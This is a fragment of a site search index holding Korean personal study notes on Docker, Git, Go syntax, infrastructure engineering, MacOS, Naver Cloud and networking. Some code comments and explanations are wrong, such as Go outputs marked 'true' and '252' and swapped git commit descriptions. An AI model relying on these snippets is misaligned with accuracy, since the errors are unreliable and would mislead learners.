관리가 가능해집니다. 프론트엔드 엔지니어와 모바일 어플리케이션 엔지니어에게도 기초 기술로 자리 잡을 수 있습니다.  "}),a.add({id:17,href:'/docs/docker/docker/dockertraining/infradocker-01/',title:"Docker의 기능",content:"Docker의 기능    이미지를 만드는 기능 ( Build )    Docker는 애플리케이션의 실행에 필요한 프로그램 본체, 라이브러리, 미들웨어, OS나 네트워크 설정등을 모아 DOcker Image를 생성\n  Dockerfile을 통해 자동으로 이미지 생성이 가능\n  Docker Image는 겹처서 사용이 가능\n     Docker 이미지를 공유하는 기능 ( Ship )    Docker Imamge는 Docker Hub에서 공유를 받거나 받을 수 있음\n  Docker HUb는 GitHub나 Bitbucket과 연계가 가능하여 자동화가 가능\n     Docker 컨테이너를 작동시키는 기능 ( Run )    Docker는 컨테이너 단위로 서버 기능을 작동시킴, 이 컨테이너의 바탕이 되는 것이 Docker의 이미지\n  컨테이너의 기동, 정비, 파기는 Docker의 명령을 사용\n  Docker는 OS상에서 프로세스를 실행시키는 것과 같기에 더욱 빠른 속도로 실행이 가능\n     Docker 컴포넌트    Docker Engine ( Docker의 핵심기능 )\n Docker Image를 생성하고 컨테이너를 기동시키기 위한 Docker의 핵심기능으로 Docker 명령의 실행이나 Dockerfile에 의한 이미지도 생성        Docker Registry ( 이미지 공개 및 공유 )\n 컨테이너의 바탕이 되는 Docker 이미지를 공개 및 공유하기 위한 레지스트리 기능으로, Docker의 공식 레지스트리 서비스인 Docker Hub도 Docker Registry를 사용        Docker Compose ( 컨테이너 일원 관리 )\n 여러 개의 컨테이너 구성 정보를 코드로 정의하고, 명령을 실행함으로써 애플리케이션의 실행환경을 구성하는 컨테이너 관리 툴        Docker Machine ( Docker 실행 환경 구축 )\n 로컬 호스트용인 VirtualBox를 비롯하여 Amazon Web Services Ec2나 Microsoft Azure와 같은 클라우드 환경에 Docker의 실행 환경을 명령으로 자동 생성하기 위한 툴        Docker Swarm ( 클러스터 관리 )\n  DOcker Swarm은 여러 Docker Host를 클러스터화하기 위한 툴로, DOcker Swarm에서는 클러스터를 관리하거나 API를 제공하는 역할을 Manager가, Docker 컨테이너를 실행하는 역할은 Node가 담당하며 이를 Kubernetes로도 사용이 가능\n  Docker를 클라이어늩 OS에서 사용하려면 Docker for mac 혹은 Docker for windows를 사용\n       Docker의 작동 구조  컨테이너를 구획하는 장치 ( namespace )   Docker는 컨테이너를 독힙된 환경으로 만들고, 그 컨테이너를 구획하여 애플리케이션의 실행해는 환경을 만듦\n  이를 namespace라 칭함\n      PID namespace\n  PID란 Linux에서 프로세스에 할당된 고유한 ID를 뜻하며, PIDnamespace는 PID와 프로세스를 격리시키는 역할을 수행 namespace가 다른 프로세스끼리는 서로 액세스가 불가능\n     Network namespace\n  Network namespace는 네트워브 디바이스, IP주소, 포트번호, 라우팅 테이블, 필터링 테이블과 같은 네트워크 리소스를 격리된 namespace마다 독릭접으로 가질 수 있음\n     UID namespace\n  UID namespace는 UID ( 사용자ID ), GID ( 그룹ID )를 namespace별로 독립적인 공간으로 가질 수 있는 형태\n     Mount namespace\n  Mount namespace를 조작하면, namespace 안에 격리된 파일 시스템 트리를 만듦\n     UTS namespace\n  UTS namespace는 namespcae별로 호스트명이나 도메인 명을 독자적으로 가질 수 있음\n     IPC namespace\n  IPC namespace는 프로세스 간의 통신(IPC) 오브젝트를 namespace별로 독립적으로 가질 수 있으며, IPC는 System V 프로세스 간의 토신 오브젝트라고 하는 공유 메모리나 세마포어/ 메시지 큐를 의미\n  세미포어란 프로세스가 요구하는 자원 관리에 이용되는 배타제어 장치이며, 메시지 큐란 여러 프로세스 간에서 비동기 통신을 할 떄 사용되는 큐잉 장치를 의미\n     릴리스 관리 장치 ( cgroups )    Docker에서는 물리 머신 상의 자원을 여러 컨테이너가 공유하여 작동하며, 이 때 Linux 커널의 기능인 \u0026lsquo;control groups(cgroups)\u0026rsquo; 기능을 사용하여 자원의 할당 등을 관리\n  chroups로 컨테이너 안의 프로세스에 대해 자원을 제한함으로써 호스트 OS의 자원을 모두 사용해버리는 상황이 발생을 예방\n     네트워크 구성 ( 가상 브리지/ 가상 NIC )    Docker는 docker0라는 가상 브리지 네트워크로 연결 / 기본 CIDR 172.17.0.0/16\n  Docker는 NAPT ( Network Address Port Translation )을 통해 IP, Port를 변환\n     Docker의 이미지 데이터 관리 장치   데이터를 복사 시 원본 데이터를 참조시켜 원본 또는 복사에 수정이 가해진 시점에서 빈 공간을 확보하고 데이터를 복사하며 이를 \u0026lsquo;Copy on Write\u0026rsquo;라 칭함     AUFS\n 다른 파일 시스템의 파일이나 디렉토리를 투과적으로 겹쳐서 하나의 파일 트리를 구성할 수 있는 파일 시스템       Btrfs\n Linux용 Copy on Write으로 과거의 상태로 돌아갈 수 있는 롤백 기능이나 특정 시점에서의 스냅샷 기능의 사용이 가능       Device Mapper\n  Linux 커널 2.6에 들어간 Linux 블록 디바이스 드라이버와 그것을 지원하는 라이브러리들을 의미\n  Device Mapper는 파일 시스템의 블록 I/O와 디바이스의 매핑 관계를 관리\n       OverlayFS\n UnionFS 중 하나로, 파일 시스템에 다른 파일 시스템을 투과적으로 머징(Merging)하는 장칠, Linux 커널 3.18에 적용됨으로써, 읽기전용 파일의 수정이 가능       ZFS\n ZFS는 썬 마이크로시스템즈(Oracle)가 개발한 파일 시스템으로, 볼륨 관리, 스냅샷, 체크섬, 리플리케이션 등을 지원      "}),a.add({id:18,href:'/docs/gcp/googlecloudplatform/',title:"GCP docs",content:"          아직 정리가 필요합니다! "}),a.add({id:19,href:'/docs/development/git/git/',title:"Git",content:"Git과 Github  깃 ( git )    Git 공식 홈페이지 에서 다운로드\n  형상 관리 도구 ( Configuration Management Tool )인 분산형 관리 시스템\n  무료, 공개소프트웨어 서비스\n  소스코드를 주고 받을 필요 없이, 같은 파일을 여러 명이 동시에 작업하는 병렬 개발이 가능\n  분산 버전관리이기 때문에 인터넷이 연결되지 않은 곳에서도 개발을 진행할 수 있으며, 중앙 저장소가 날라가벌도 다시 원상복구가 가능\n     git의 특징   버전관리   깃에서 버전이란 문서를 수정하고 저장할 때마다 생기는 지점\n  원래 파일 이름은 그대로 유지하면서 파일에서 무엇을 변경했는 지 변경 시점마다 저장이 가능\n  각 버전마다 작업했던 내용을 확인할 수 있음\n  과거의 버전으로 회귀가 가능\n     Stage 와 Commit   작업 트리: 파일 수정, 저장 등의 작업을 하는 디렉토리\n  스테이지: 버전으로 만들 파일이 대기하는 장소\n  저장소: 스테이지에서 대기하고 있던 파일들을 버전으로 만들어 저장하는 장소\n      hello.txt 파일 문서를 수정하고 저장하면 그 파일은 작업 트리에서 스테이지로 이동    파일 수정을 마쳤다면 버전을 만들기 위해 Commit 명령을 내림 Commit 명령이 내려지면 새로운 버전이 생성되며 스테이지에 대기하던 파일 모두 저장소에 저장 됨     백업   원격 저장소   깃에서는 지역( Local ) 저장소와 원격( Remote ) 저장소를 연결해 버전 관리하는 파일들을 쉽게 백업이 가능\n  원격 저장소에서 깃을 사용가능\n  지역 저장소를 백업 가능\n  협업 프로젝트에 사용 가능\n  다른 사람의 소스 관찰 및 오픈 소스 참여 가능\n     협업   git 파일의 단계    untracke: 한 번도 스테이지 상태에 올라가지 않은 파일\n  tracked: 한 번이라도 스테이지 상태에 올라간 파일\n  unmodified: 스테이지 상태에서 commit이 실행된 후 파일의 상태\n  modified: unmodified 상태에서 수정된 후 파일의 상태\n  .gitgnore: 버전 관리 중인 디렉토리 안에 버전 관리를 하지 않을 특정 파일 또는 디렉토리가 있는 경우 .gitignore의 목록을 지정 가능\n   Branch   Branch는 분기를 요구에 따른 나타냄    git 원격접속   SSH ( Secure SHell )   보안이 강화된 안전한 방법으로 정보를 교환하는 방식\n  Private key, Public key를 한 쌍으로 묶어 컴퓨터를 인증\n      key 생성 Private key를 복사 후 로그인 사용자 아이콘의 Setting을 클릭\n  SSH and GPG keys 선택 후 퍼블릭 키를 추가하기 위해 New SSH key 선택\n  퍼블릭 키를 복사 ( 비밀번호 확인 )\n  새로운 저장소를 생성 후 명령어를 통해 원격 저장소와 연결\n     git 명령어   사용자 이름 설정 ( 시스템 전체 )  git config --global user.name [ user name ]  사용자 이메일 설정 ( 시스템 전체 )  git config --global user.email [ user email ]  깃 초기화  git init  저장소 상태확인  git status  파일 스테이징  git add \u0026#34;수정파일\u0026#34;  Commit  git commit --amend  방금 출력한 Commit 메시지 수정  git commit -m \u0026#34;message\u0026#34;  git 버전 확인  git log / git log --stat ( commit status )  변경 사항 확인  git diff  작업 트리를 최신으로 되돌리기  git checkout --[ file name ]  스테이징 되돌리기 일반 | 최신 커밋 전 | 최신 커밋과 스테이징 전 | 수정 전 상태 복구 x  git reset HEAD [ File name ] --soft HEAD^ --mixed HEAD^ --hard HEAD^  브랜치 확인  git branch  브렌치 생성  git branch [ branch name ]  브렌치 제거  git branch -D [ branch name ]  브렌치 이동  git checkout [ branch name ]  브랜치 사이의 차이점 알아보기  git log [ A ]..[ B ]  편집기 열리지 않게 하기  git merge o2 --no-edit  편집기 열기  git merge o2 edit  지역 저장소 생성  git init [ Storage name ] cd [ Storage name ] vi [ any file ] git add [ any file ] git commit -m add [ any file ]  원격 저장소 연결  git remote add origin [ copy address ] git remote -v  원격 저장소에 파일 올리기 u | f, 지역과 원격 연결 1회 | 강제  git push -u [ destination ] [ branch ]  원격 저장소에서 파일 내려 받기  git pull [ source ] [ branch ]  SSH 키 생성  ssh-keygen  SSH 주소로 원격 저장소 연결  git init ssh-connect cd ssh-connect git remote add [ destination ] [ git@github.com:username@connect-ssh.git]  원격 저장소 복제  git clone [ git address]    "}),a.add({id:20,href:'/docs/development/golang/golang/',title:"Golang 기본",content:"Golang 설치  Go 공식 홈페이지에서 OS맞는 패키지를 설치   Golang Study 사이트  Go 기본 메뉴얼 가장 빨리 만나는 Go 언어 Go-tour    Go 기초 문법  중괄호 표기법  Go는 문법의 작성 스타일을 강제 Go의 대표적인 문법으로는 { } ( 중괄호 ) 표기 법이 있음 즉, 함수, 조건문, 반복문 등을 시작할 때는 반드시 같은 줄에서 시작   ; 세미콜론  마지막 구문의 세미클론을 생략 한 줄에 여러 구문을 사용할 때에는 세미콜론을 사용하여 나눔  fmt.Println(\u0026#34;Hello,\u0026#34;);fmt.Println(\u0026#34;world!\u0026#34;)  주석 // 한줄 주석 /* 여러 줄 주석 여러 줄 주석 */   변수 사용하기  var 키워드 사용하는 방식  var i int var s string var age int = 10 var name string = \u0026#34;Maria\u0026#34;   자료형을 사용하는 방식  var age = 10 var name = \u0026#34;Maria\u0026#34;   :=를 사용하면 var와 자료형 키워드를 사용하지 않고 선언가능  age := 10 name := \u0026#34;Maria\u0026#34;   , ( 컴마 )를 사용하여 여러 변수를 선언하기  변수를 선언한 순서대로 값이 대입되며, 반드시 선언한 변수의 개수와 대입할 값의 개수가 값아야 함    var x, y int = 30, 50 var age, name = 10, \u0026#34;Maria\u0026#34; a, b, c, d := 1, 3.4, \u0026#34;Hello, world!\u0026#34;, false var x, y int var age int x, y, age = 10, 20, 5   var를 사용한 다중처리  var ( x, y int = 30, 50 age, name = 10, \u0026#34;Maria\u0026#34; )   _( 밑줄 문자 )를 사용한 에러 방지  package main import \u0026#34;fmt\u0026#34; import _ \u0026#34;time\u0026#34; // 사용하지 않는 패키지로 인한 컴파일 에러 방지 func main() { a := 1 b := 2 _ = b // 사용하지 않는 변수로 인한 컴파일 에러 방지  fmt.Println(a) }  선언만 하고 사용하지 않는 변수가 있으면 에러 발생 import 하고 사용하지 않는 패키지가 있으면 에러 발생  \r  Golang 자료형  \rGo 변수의 종류와 값의 범위\r↕\r\r\r\r\r   8진수에는 앞에 0이, 16진수 앞에는 0x or 0X가 붙음  var go1 int = 30 var go2 int = -15 var go3 int = 0723 // 8진수로 저장 var go4 int = 0x2f2c75 or 0X2f2c75 // 16진수로 저장   실수는 소수점을 사용 및 지수 표기법으로 선언이 가능  // 소수점 표기 var go1 float32 = 0.5 var go2 float32 = .32 var go3 float32 = 100.12345 // 지수 표기 var ggo1 float32 = 1e7 var ggo2 float64 = .12345E+2 var ggo3 float64 = 1.23453e-10   복소수난 실수부와 허수부가 붙은 형태이며 마지막에 i를 붙임  real 함수는 실수부를 호출 imag 함수는 허수부를 호출    var go complex64 = 1 + 2i // 실수부 1, 허수부 2 var go2 complex128 = 2.2344e-10 + .12345E+2i // 실수부 지수 표기법 2..., 허수부 지수 표기법 .12345E+2 var go3 complex64 = coplex(1, 2) // 실수부 1, 허수부 2 var go4 complex128 = complex(2.2344e-10 + .12345E+2i) // 실수부 지수 표기법 2..., 허수부 지수 표기법 .12345E+2  var r1 float32 = real(num1) // 실수부 1 호출 var l1 float32 = imag(num1) // 허수부 2 호출  컴퓨터는 2진수로 계산하기에 정확한 실수의 계산이 불가능 즉, == ( 등호 )로 비교시 오류발생가능  \r  byte는 16진수, 문자 값으로 저장 byte는 데이터를 읽고 쓰기, 데이터 암호화에 사용  var go1 byte = 10 // 10진수로 저장 var go1 byte = 0x32 // 16진수로 저장 var go1 byte = \u0026#39;a\u0026#39; // 문자로 저장  byte 사용시 문자열 컴파일시 \u0026quot; \u0026quot; 가 아닌 ' \u0026lsquo;를 사용해야 함  \r Rune  Rune은 유니코드 ( UTF-8 ) 문자 코드를 저장할 때 사용 ' ' ( 작은 따움표 )로 묶어줘야 함 \\u, \\U를 사용하여 문자 코드로 저장이 가능 전체 유니코드  var go1 rune = \u0026#39;한\u0026#39; var go2 rune = \u0026#39;\\ud55c\u0026#39; var go3 rune = \u0026#39;\\U0000d55c\u0026#39; // 전부 \u0026#39;한\u0026#39;을 출력  숫자 연산  *숫자 연산에는 +, , /, %, \u0026laquo; \u0026raquo;, ^이 사용 가능 서로 다른 자료형일 경우 컴파일 에러 발생  go1 := 3 go2 := 2 fmt.Println(go1 + go2) // 5 fmt.Println(go1 - go2) // 1 fmt.Println(go1 * go2) // 6 fmt.Println(go1 / go2) // 1 fmt.Println(go1 % go2) // 1 fmt.Println(go1 \u0026lt;\u0026lt; go2) // 12 fmt.Println(go1 \u0026gt;\u0026gt; go2) // 0 fmt.Println(^go1) // 252: 비트 반전 연산자  오버플로우와 언더플로우  자료형에서 저장할 수 있는 최대 크기가를 넘어서면 오버플로우 자료형에서 최소 크기보다 작아지면 언더플로우라 함   변수의 크기  C 언어의 sizeof 연산자와 같이 go 에서는 unsafe 패키지의 Sizeof 함수를 사용  package main import \u0026#34;fmt\u0026#34; import \u0026#34;unsafe\u0026#34; ... (unsafe.Sizeof(int8)) // 1 ... (unsafe.Sizeof(int16)) // 2 ... (unsafe.Sizeof(int32)) // 4 ... (unsafe.Sizeof(int54)) // 8 }   문자열 사용  문자열은 \u0026quot; \u0026quot; ( 따움표 )로 묶어주야 하며, 알파벳, 한글, 한자 등이 사용 가능 여러 줄로 된 문자열의 저장에는   (백 쿼트 ) 사용 변수와 동일하게 \\u, \\U를 사용하여 문자 코드로 저장이 가능 Go 언어는 변수에 문자열을 저장한 뒤 수정이 불가능  var go string = \u0026#34;Hello, go world!\\n\u0026#34; go2 := \u0026#34;Hello, go world!\\n\u0026#34; var go3 string = `Hello, go world!` go4 := `Hello, go world!`  문자열 길이 구하기  \u0026ldquo;한글\u0026quot;의 문자열의 길이는 6 \u0026ldquo;Hello\u0026quot;의 문자열의 길이는 그대로 5 2바이트가 넘는 문자열의 길이를 구할 때는 unicode/utf8을 사용 문자열의 길이를 구할 때는 len함수를 사용  package main import \u0026#34;fmt\u0026#34; import \u0026#34;unicode/utf8\u0026#34; func main() { var s1 string = \u0026#34;한글\u0026#34; fmt.Println(utf8.RuneCountInString(s1)) }  문자열 연산하기  문자열을 비교할 때는 == 연산자를 사용 문자열을 붙일 때는 + 연산자를 사용  go1 := \u0026#34;한글\u0026#34; go2 := \u0026#34;Go\u0026#34; fmt.Println(go1 == go2) // true fmt.Println(go1 + go2) // 한글Go fmt.Println(go2 + \u0026#34;는 비버인가?\u0026#34;) // Go는 비버인가?  fmt.Println(%c\\n, go2[0]) // G 제어문자  \r제어문자\r↕\r\r제어 문자  \\a: 경고음, 벨(u0007) \\b: 백스페이스(u0008) \\f: 폼 피드(u000c) \\n: 라인 피드, 새 줄(u000a) \\r: 캐리지 리턴(u000d) \\t: 수평 탭(u0009) \\v: 수직 탭(u000b) : 백슬래시(u005c) ': 작은따옴표(u0027), rune 변수에 저장할 때 사용할 수 있습니다. \u0026quot;: 큰따옴표(u0022), string 변수에 저장할 때 사용할 수 있습니다.  \r\r\r    상수 사용하기  Go 언어에서는 const 를 사용하여 상수 생성이 가능 변수와 마찬가지로 문자 또는 _로 시작해야 함 consr 키워드와 ( )를 사용하면 여러 개를 한 번에 선언 및 초기화 가능  const age int = 20 const name string = \u0026#34;Maria\u0026#34; const score int // 컴파일 에러 age = 20 // 컴파일 에러 name = \u0026#34;Ede\u0026#34; // 컴파일 에러  const ( x, y int = 10, 20 age, name = 10, \u0026#34;Maria\u0026#34; ) Const와 ( ) 사용해서 열거형에 사용이 가능  상수에 일일이 대입하지 않고, 순서대로 생성하려면 iota 를 사용 1 부터 시작하길 원하면 iota +1 사용 ( 다른 연산자도 사용 가능 )  const ( Sunday = iota // 0  Monday // 1  Tuesday // 2  ... Saturday // 6 ) var a int = 1 var b float32 = 1.3 var c float32 = a + b  package main // 패키지 설정 import \u0026#34;fmt\u0026#34; // \u0026#34;fmt\u0026#34; 패키지를 import 시킨다 func main() { fmt.Println(\u0026#34;Hello, world!\u0026#34;) } // \u0026#34;fmt\u0026#34; 패키지의 Println 함수 사용   Go의 연산자  = 대입 연산자  "}),a.add({id:21,href:'/docs/infra/infra/',title:"Infra engineer",content:"Infra engineer    Infra engineer\n  Infra engineer란?\n  Server\n  Operating System\n  Network\n  Storage\n  Solution\n  Infra operation\n      "}),a.add({id:22,href:'/docs/infra/infra/infra01/',title:"Infra engineer란?",content:"Infra engineer    Infra enginner의 정의와 역할    Infra enginner란 Infra(infrastructure)와 enginner의 합성어로 IT의 기본 틀을 잡는 역할을 수행한다고 할 수 있습니다.\n  Architecture와 Infra의 차이는 아키텍처는 컴퓨터와 소프트웨어의 호환성, 더 나아가 최근에는 기업에 적합한 클라우드 컴퓨팅을 설계해준다 할 수 있으며, Infra enginner은 기본적인 하드웨어의 세팅(IDC, VDI)을 주로 다룬다고 할 수 있습니다.\n  하지만 최근 클라우드 시장이 급격하게 성장함에 따라, 사실상 Infra enginner의 영역이 줄어들고 있는 것은 사실이지만, 대부분의 IT시장의 기본이 되는 만큼 공부할 가치가 있습니다.\n     Infra engieer 역할    인프라 엔지니어의 역할은 정보화 사회의 고도화된 IT 인프라를 지탱하는 역할을 수행합니다.\n  이와 같은 역할은 크게 인프라 설계, 인프라 구축, 인프라 운영으로 이루어집니다.\n    인프라 설계   인프라를 만들 때는 인프라를 만든 목적을 토대로 그 목적을 달성하기 위해 필요한 기능이나 성등 등의 조건들을 정리해야합니다.\n  조건이 정리되면 조건에 맞는 절적할 기획서와 설계서를 작성해야 하며, 어떤 인프라를 어느 정도의 비용으로, 어느 정도의 기간 내에 만들 수 있는지 예상하는 작업을 수행합니다.\n       인프라 구축   필요한 기능이나 소프트웨어 등을 발주해서 납품을 받으면 인프라 구축을 시작하며, 인프라 구축 작업은 기기의 운반과 조립, 장착, 설치, 설정, 동작 테스트, 부하 테스트 등으로 분류가 가능하다.\n  인프라 구축에는 SI(System Integration) 업계에서 기기를 들여와서 하드웨어 관련 작업은 CE(Customer Engineer)가, 서버나 스토리지 설정은 SE(System Engineer)가, 네트워크 장비의 대한 설정은 NE(Network Engineer)가 주로 수행하며, IE(Infra Enginner)은 이를 모두 계획 및 관리해야합니다.\n       인프라 운영   구축한 IT 인프라는 가동 후에도 계속해서 정상적으로 동작하도록 운형해야만 하므로 24시간, 365일 내내 가동되어야 하기 때문에 직접 인프라를 운영하는 회사는 몇 개의 팀을 만들어 교대로 운영하는 것이 일반적입니다.\n  인프라 운영에는 주로 장애 대응, 수용량 관리, 인프라가 원인이 아닌 문제의 파악으로 나눌 수 있습니다.\n     장애 대응\n 장애 대응에는 하드웨어 고장이나 급격한 엑세스 증가에 대한 대책부터 부적절한 권한 설정에 의해 엑세스가 불가능한 상황의 해소가 필요합니다.    수용량 관리\n 일단 구축한 인프라는 시간이 지나면 데이터 플로어가 변동하는 데, 이를 위해 적절하게 조정해야합니다.    인프라가 원인이 아닌 문제의 파악\n 대부분의 시스템 문제는 먼저 인프라 엔지니어에게 문의가 들어오는 경우가 잦으며, 이에 인프라 엔지니어는 인프라 분야의 문제이면 이를 해결하거나, 다른 분야면 해당 분서에 대응을 요청해야 합니다.         IT Infra를 구성하는 요소    Facility\n 퍼실리티란 건물, 시설, 설비 등을 의미하며, 데이터 센터와 데이터 센터를 구성하는 랙, 에어컨, 발전기, 변압기, 소화 설비 등이 포함됩니다.       Server, Storage\n IT 서비스르 ㄹ제공하는 서버와 데이터를 대량으로 저장하는 스토리지를 가리킨다.       Network\n Server와 Storage를 연결하고 인터넷에 접속하는 네트워크를 의미한다.       IE의 기술적 요인   IE는 우수한 기술자여야 하며, 트렌드의 변화에 뒤처지지 않아야하며, 정확한 정보와 지식을 통해 요청받은 과제에 적합한 답을 도출할 수 있어야 합니다.     Server Hardware\n 서버 하드웨어는 주로 IA(Intel Architecture) 서버와 엔터프라이즈 서버 두 가지로 나뉘며, 양쪽 모두 메인보드, CPU, 메모리, 디스크, NIC, PSU와 같은 주요 부속의 조합으로 구성됩니다.       Server OS\n 서버 운영체제는 거의 리눅스, 윈도우, 유닉스 세 가지로 집약된다. 시간을 들여 공부하면 각 운영체제의 개념이나 기능에 정통하는 것이 어려운 일은 아니나, 이론과 실전이 다르듯이 필드에서 공부할 수 있는 것이 달라 실전 경험을 쌓으며 공부하는 것이 매우 중요합니다.       Storage\n 디스크의 대용량화, 플래시 디스크의 등장에 따른 고속화, 데이터의 폭발적 증가 등을 배경으로 스토리지 가상화, 씬 프로비저닝, 증복 제거, 스냅샷 등 신기술이 속속 등장하고 있으며, 새로운 기술의 장단점을 신중하게 파악하고 비용 대비 효과 측면에서 적절한 스토리지를 선정할 수 있는 능력이 필요합니다.       Network\n 오늘날에는 네트워크에서 사용되는 통시 프로토콜이 TCP/IP로 거의 잡약되므로, 여러 통신 프로토콜을 사용하는 과거와는 달리 편해졌다고 할 수 있다. 하지만 네트워크의 흐름이란 눈에 보이지 않는 것으로 네트워크를 구축할 때는 설계 단계부터 모든 각도에서 검토해 문제점을 해결할 필요가 있습니다.       Network Interface\n 네트워크 장비의 주된 역할은 통신의 교환이다. 네트워크 장비 카탈로그를 보면 다양한 정보가 기재되어 있어 어렵게 느껴질지도 모르지만, 기본적으로는 연결하는 서버 및 네트워크 장비와 수와 커넥터의 차이, 어느 정도의 통신량을 얼마의 속도로 교환하고 싶은지, 라우터, L2, L3, L4, L7 스위치의 차이를 파악해두어야합니다.       IE의 재량적 요인   IT 인프라를 구축한다는 것은 다양한 선택에서 가장 적합한 선택을 자신의 지식을 바탕으로 구축해나아간다는 것이며, 이를 위해 IE는 프로젝트의 성질이나 기업문화 혹은 최종 결재권자의 사고 방식 등이 고려되어야 합니다.     시스템 구성\n 프로젝트에 대해서 어떤 시스템을 어느 정도의 규모로 어떻게 구성할 것인지를 검토해야합니다. (메일 서버를 이중화로 구성할지, 데이터 영역을 분리 할지 등)       Server Type\n IE는 프로젝트나 기업에 적합한 서버의 사양을 위해 CPU, 메모리, 디스크, RAID, NIC, PSU의 이중화 필요성, 보수 연수, 보수 레벨, 물리적 크기 및 중량 등을 고려해야합니다.       Network\n 네트워크 구성을 검토할 때도 다양한 결정과 선택이 필요합니다.       Database\n 데이터베이스의 종류와 요건을 검토해야합니다.       시스템 감시\n 시스템을 어떻게 감시하고 운영할 것인지를 검토해야합니다.      "}),a.add({id:23,href:'/docs/system/macos/macos04/',title:"Mac OS",content:"****         ****          "}),a.add({id:24,href:'/docs/system/macos/macos01/',title:"MacOS",content:"MacOS    MacOS는 Apple에서 만든 운영체제로 초기에는 Maclntosh System이라 칭함\n  오직 Mac을 위한 운영체제로 응용 프로그램의 설치가 간단하며, Windows용 프로그램들을 대부분 설치 프로그램을 통해 설치해야하는 반면 MacOS는 실행 파일과 그 부속파일을 설치한 폴더를 아무 곳이나 복사하면 그것으로 설치\n  즉, MacOS는 Windows에 비해 가벼운 OS라고 할 수 있으며, 드라이버, 운영체제 가 간단하며, 확장자가 없고 확장자 대신 HFS, HFS+의 파일 메타 정보에 들어있는 생성자와 타입 속성에 네 글자의 알파뱃 또는 숫자로 정보를 구성해 저장\n  MacOS는 UNIX운영체제로 초기에 발전하였지만, 스티브 잡스 복귀 이후 OS X(현재의 MacOS) 직접적인 상관관계는 없다고 할 수 있다.\n     MacOS 장점    최적화 및 소프트웨어 업데이트가 가벼움\n  영상편집, 음악 관련 소프트웨어가 독보적\n  멀티태스킹 지원\n  애플 기기간의 호환성\n     MacOS 단점   폐쇄성 ( MS-Office 연동 등 ) 직관적이지만 배워야 하는 OS Active X 사용불가 ( 은행업무 등에 지장이 있음 ) 공공기관 업무 ( 세금, 금융 )    "}),a.add({id:25,href:'/docs/system/nas/',title:"NAS",content:"NAS     NAS docs\n 정리중입니다!    "}),a.add({id:26,href:'/docs/ncp/ncptraining/nca01/',title:"Naver Cloud Assoicate",content:"Naver Cloud Assoicate 교육목적    클라우드 서비스에 대한 기초적인 지식습득\n  Naver Cloud 상품에 대한 이해화 기초 활용법 습득\n  네이버 클라우드 상품 라인업에 대한 이해\n  네이버 클라우드 기초 사용법\n       Cloud    1960년대 부터 가상화라는 용어사용(IBM)\n  VMware\n  Hyper-V\n  KVM\n  Xen\n        공공 클라우드\n  공공 클라우드 인증을 받은 클라우드\n  여러 공공적으로 사용에 적합한 클라우드로 KT 클라우드 다음으로 NC가 가장 많은 비율을 차지\n  별도의 커버먼트 도메인을 존재하여 사용\n        금융 클라우드\n 금융 및 핀테크 기업들이 법적인 규제에 대해 안심하고 사용할 수 있는 국내 최초의 전문 금융 클라우드        클라우드를 사용하는 이유\n  비용절감 ( 유연성 )\n  빠른 Deploy ( 빠른속도 )\n  글로벌 진출시 용이 ( 확장성 )\n  보안적 이유 ( 전문성 )\n      "}),a.add({id:27,href:'/docs/ncp/ncptraining/nca02/',title:"Naver Cloud Assoicate",content:"****         ****         #\n "}),a.add({id:28,href:'/docs/ncp/navercloudplatform/ncp00/',title:"NCP",content:"****         ****         #\n "}),a.add({id:29,href:'/docs/ncp/navercloudplatform/ncp01/',title:"NCP",content:"****         ****         #\n "}),a.add({id:30,href:'/docs/ncp/navercloudplatform/ncp02/',title:"NCP",content:"****         ****         #\n "}),a.add({id:31,href:'/docs/ncp/navercloudplatform/',title:"NCP docs",content:"NCP docs    현재 정리하고 있습니다!  "}),a.add({id:32,href:'/docs/network/network/natwork-1/',title:"Network",content:"Network    Network란 무엇인가?       네트워크란 물리적으로 떨어져 있는 여러 시스템을 연결하여 데이터를 주고 받을 수 있게 연결되어 있는 시스템\n  노드들이 데이터를 공휴할 수 있게 하는 디지털 전기 통신망의 한 종류로, 분산되어 있는 컴퓨터를 통신망을 통해 연결한 것을 말한다.\n  흔히 사람들은 네트워크와 인터넷을 함께 혼용하지만 인터넷은 문서, 그림, 영상과 같은 여러가지 데이터를 공유하도록 구성된 거대한 네트워크를 의미로, 인터넷이 네트워크에 포함되어 있다고 할 수 있다.\n  또한 www를 인터넷으로 착각하는 경우가 있는 데, www는 인터넷을 통해 웹과 관련된 데이터를 공유하는 기술이다.\n     네트워크의 분류   크기의 따른 분류     분류 설명     LAN Local Area Network, 하나의 장비(스위치)에 연결되어 있는 여러 시스템이 속한 네트워크   WAN Wide Area Network, 하나 이상의 LAN으로 구성된 네트워크   PAN Personal Area Network, 개인이 사용하는 작은 단위의 네트워크   MAN Metropolice Area Network, 하나의 도시 단위의 네트워크        구성방법에 따른 분류      분류 설명     스타형 중앙에 있는 네트워크 장비를 통해 모두 연결된 형태, 중앙의 장비가 고장나면 모든 시스템들이 통신 불가 2계층, 스위치 장비를 통해 LAN 대역을 구성   망형 모든 시스템들이 각각 개별적으로 연결됨, 비용이 많이 든다. 3계층, 라우터 장비를 통해 WAN 대역을 구성   버스형 하나의 선을 통해 여러 시스템을 연결   트리형 시스템을 여러 계층으로 나눠서 연결   링형 인접 시스템을 1:1로 연결   혼합형 여러 형태를 조합하여 구성한 형태       네트워크의 통신방식    그림 옵션 설명      유니캐스트 1:1 통신을 할 때 사용하는 방식, 특정 대상과 통신을 할 때 사용하는 방식    멀티캐스트 1:n 특정 그룹과 통신하는 방식    브로드캐스트 1:n 네트워크 내의 모든 시스템과 통신하는 방식, 불특정 다수와 통신       네트워크 프로토콜  네트워크 내의 시스템 간의 통신을 위한 규칙, 약속 이는 택바와 유사하며, 특정 노드가 어느 노드에게 어떤 데이터를 어떻게 보내는 지를 작성하기 위한 양식    기본적으로 패킷이라 한다.     cmd에서 tracert 8.8.8.8 로 확인\n   네트워크 패킷 ( Network Packet )    패킷이란 데이터의 묶음 단위로 한번에 전송할 데이터의 크기\n  제 3계층 이상 ( Network 계층 ) 에서는 이 데이터의 묶음을 패킷이라고 부르며, 제 2계층에서는 프레임( Frame )\n  패킷의 크기는 네트워크의 종류에 따라 크기가 다름\n  패킷을 이렇게 나눠 보내는 이유는 컴퓨터는 동시다발적으로 데이터를 전송하는 데, 한 데이터에게만 데이터를 줄 경우, 한 컴퓨터와의 통신밖에 하지 못하기에, 데이터를 나눠 모두에게 통신할 수 있게 하며, 중간에 에러가 날 경우를 대비\n     패킷의 기본 구조      크게 패킷은 헤더 ( header ) 와 페이로드 ( Payload ) 두 부분으로 나누어 진다.\n Hader: 출발 주소, 도착 주소, 패킷 길이 등 ( 헤더에 종류에 따라 